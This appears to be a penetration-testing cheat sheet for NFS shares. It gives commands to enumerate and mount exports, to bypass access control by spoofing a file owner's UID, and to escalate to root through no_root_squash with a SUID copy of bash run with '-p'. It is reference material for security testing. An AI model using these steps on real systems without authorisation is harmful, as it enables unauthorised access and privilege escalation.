# NFS

## Mount remote share

### Enumerate shared folders

```
showmount -e <IP>
```

### Mount folder

```
mkdir <folder>
mount -t nfs <rhost>:<path> <local folder> -o nolock
mount -t nfs -o vers=2 <rhost>:<path> <local folder> -o nolock
```

## Exploits

### Gain ownership of folders

Navigate to the mounted folder and obtain the UID of the file owner. Then create a new user on your machine with the same UID, unmount the remote folder, switch to the new user and mount again. This will allow you to ignore access control on the folders since NFS check for permissions client-side

```
useradd <username> -u <UID> -m -s /bin/bash
su <username>
```

### NFS no\_root\_squash

#### On local machine

Write a SUID executable to the remote share (copy /bin/sh or compile your own executable then `chmod +s` the payload)

```
mkdir /tmp/remote
mount -t nfs <rhost>:<shared folder> /tmp/remote
cd /tmp/remote
cp /bin/bash .
chmod +s bash
```

#### On target

Navigate to the shared folder and execute the payload, if /bin/bash was used, remember to invoke it with -p switch or the SUID bit will be dropped

```
cd <shared folder>
./bash -p
```

